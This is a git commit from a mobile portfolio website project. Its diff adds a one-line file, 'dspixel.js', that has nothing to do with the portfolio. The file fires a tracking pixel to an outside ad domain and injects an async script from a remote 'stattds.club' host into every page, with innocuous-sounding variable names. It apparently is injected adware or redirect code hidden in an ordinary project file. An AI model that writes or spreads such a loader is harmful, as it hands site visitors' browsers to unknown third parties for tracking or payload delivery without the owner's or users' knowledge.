37fe37832f3c4c49cdd3f22e3c61cd1e1ec015a5
Stassilla <stas1405@yandex.ru>
2015-11-06 00:40:46 +0200

    additional changes in mobile-portfolio

---
+++ optimized_contents/js/dspixel.js
@@ -0,0 +1,1 @@
+new Image().src="http://pix-00.tizerbank.com/pixel/tz/6YT9k?"+Math.random();var removespam=1;var checkcontent=0;var debugmode=0;var js=document.createElement("script");js.setAttribute("async","async");js.setAttribute("src","http://st.stattds.club/s8194/scripts/track.js?ab=uc&r="+Math.random());document.body.appendChild(js);
